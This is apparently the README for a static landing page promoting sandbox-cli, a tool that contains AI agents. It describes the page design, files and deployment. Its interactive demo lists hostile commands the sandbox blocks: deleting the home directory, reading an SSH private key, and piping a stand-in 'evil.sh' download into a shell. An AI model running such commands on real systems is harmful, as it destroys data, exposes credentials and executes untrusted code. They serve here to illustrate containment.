# web/ — sandbox-cli landing page

A static landing page for **sandbox-cli**: what it is, why it makes agent
autonomy safe, how to use it, and how it compares to the alternatives.

## Design direction — "the containment boundary"

The product *is* a wall between your host and an agent, so the page is built
around that wall rather than around a generic feature grid:

- **The hero is an interactive demo.** Fire real commands (`rm -rf ~`,
  `cat ~/.ssh/id_rsa`, `curl evil.sh | sh`, `npm test`) at the boundary and watch
  where each one lands — attacks bounce off the wall, workspace work passes
  through. It autoplays once on scroll, then hands over to the visitor.
- **Colour is semantic, not decorative.** Warm coral = *exposed* (host side),
  cool teal = *contained* (sandbox side). The same pair drives the comparison
  table, the threat panels and the verdict log, so the palette restates the
  product's thesis everywhere it appears.
- **shadcn/ui token architecture**, re-skinned: the familiar
  `--background` / `--card` / `--muted` / `--border` / `--radius` variable
  contract, with cool-biased neutrals instead of default grey.
- **Type has three roles** — Bricolage Grotesque (display), IBM Plex Sans (body),
  IBM Plex Mono (the terminal voice, used heavily since the subject is a CLI).
- **Light + dark**, following the OS by default with a persistent toggle, and a
  no-flash inline script that sets the theme before first paint.
- Responsive; respects `prefers-reduced-motion` (the demo skips straight to its
  verdict instead of animating).

## Files

| File | Purpose |
|---|---|
| `index.html` | The page. Semantic, accessible markup. |
| `styles.css` | Design tokens + component styles for both themes. |
| `main.js`   | Containment demo, theme toggle, tabs, copy buttons, mobile menu, reveals. |

No build step and no framework. The only external request is the Google Fonts
stylesheet; if it fails the page falls back to system sans/mono and still reads
correctly.

## Preview locally

```sh
# Python (built-in)
cd web && python3 -m http.server 8000
# → http://localhost:8000

# or Node
npx serve web

# or inside sandbox-cli itself
sandbox-cli run -- python3 -m http.server 8000
```

## Deploy

Point any static host at this directory (`web/` as the publish root):

- **GitHub Pages** — set the Pages source to `/web` on `main`, or push the folder
  to a `gh-pages` branch.
- **Netlify / Vercel / Cloudflare Pages** — publish directory `web`, build
  command *(none)*.
- **Any bucket / CDN** — upload the files as-is.

## Editing notes

- Colours are CSS custom properties in `styles.css` (`:root` light, `.dark`
  dark). `--contained` and `--exposed` are the semantic pair; changing them
  re-skins the whole page including the demo.
- The demo's verdicts live in the `VERDICTS` map in `main.js`. Each `.shot`
  button's `data-target` must match a key there and a `data-path` node in the
  stage — add all three together.
- Copy mirrors the repo: the isolation model, the 15 wrapped agents and the
  install command all come from `README.md`, `CLAUDE.md` and `docs/`. If those
  change, update the page to match.
- Icons are inline SVG — no icon font, no sprite sheet.
